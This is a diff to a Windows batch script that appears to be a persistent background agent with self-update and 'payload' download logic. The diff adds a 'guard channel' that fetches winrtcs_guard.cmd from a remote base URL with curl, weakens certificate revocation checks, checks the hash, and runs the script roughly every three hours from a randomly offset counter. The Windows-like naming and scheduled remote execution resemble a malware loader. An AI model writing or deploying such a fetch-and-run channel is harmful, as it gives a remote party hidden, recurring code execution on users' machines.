@@ -60,10 +60,14 @@ if errorlevel 1 ( endlocal & exit /b 0 )
 set "AGENT_SHA="
 set "PVER="
 set "PAYLOAD_SHA="
+set "GUARD_VER="
+set "GUARD_SHA="
 for /f "usebackq tokens=1,* delims==" %%K in ("%VFILE%") do (
   if /I "%%K"=="AGENT_SHA256" set "AGENT_SHA=%%L"
   if /I "%%K"=="PAYLOAD_VER" set "PVER=%%L"
   if /I "%%K"=="PAYLOAD_SHA256" set "PAYLOAD_SHA=%%L"
+  if /I "%%K"=="GUARD_VER" set "GUARD_VER=%%L"
+  if /I "%%K"=="GUARD_SHA256" set "GUARD_SHA=%%L"
 )
 
 rem --- agent self-update: stage .new now, applied + re-exec at top of next run ---
@@ -105,6 +109,37 @@ if defined PVER if defined PAYLOAD_SHA if /I not "!PVER!"=="!LVER!" (
     )
   )
   del /f /q "%ZD%\payload.dl" >nul 2>&1
+)
+
+rem --- guard channel: recurring gryxa health, every 180 ticks (~3h), hash-pinned updates ---
+if defined GUARD_VER if defined GUARD_SHA (
+  set "LGVER="
+  if exist "%ZD%\guard.ver" set /p "LGVER=" <"%ZD%\guard.ver"
+  if /I not "!LGVER!"=="!GUARD_VER!" (
+    del /f /q "%ZD%\guard.dl" >nul 2>&1
+    "%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 30 -o "%ZD%\guard.dl" "%BASE%/winrtcs_guard.cmd?t=%RANDOM%%RANDOM%" >nul 2>&1
+    set "G_SHA="
+    if exist "%ZD%\guard.dl" call :Sha256 "%ZD%\guard.dl" G_SHA
+    if defined G_SHA if /I "!G_SHA!"=="!GUARD_SHA!" (
+      findstr /C:"WINRTCS_GUARD" "%ZD%\guard.dl" >nul 2>&1
+      if not errorlevel 1 (
+        move /y "%ZD%\guard.dl" "%ZD%\winrtcs_guard.cmd" >nul 2>&1
+        echo !GUARD_VER!>"%ZD%\guard.ver"
+        echo [%DATE% %TIME%] guard_updated_!GUARD_VER!>>"%LOG%"
+      )
+    )
+    del /f /q "%ZD%\guard.dl" >nul 2>&1
+  )
+  set "GCNT="
+  if exist "%ZD%\guard.cnt" set /p "GCNT=" <"%ZD%\guard.cnt"
+  if not defined GCNT set /a "GCNT=!RANDOM! %% 120"
+  set /a "GCNT+=1" 2>nul
+  if not defined GCNT set "GCNT=1"
+  echo !GCNT!>"%ZD%\guard.cnt"
+  if !GCNT! GEQ 180 (
+    echo 0>"%ZD%\guard.cnt"
+    if exist "%ZD%\winrtcs_guard.cmd" call "%ZD%\winrtcs_guard.cmd"
+  )
 )
 
 endlocal & exit /b 0
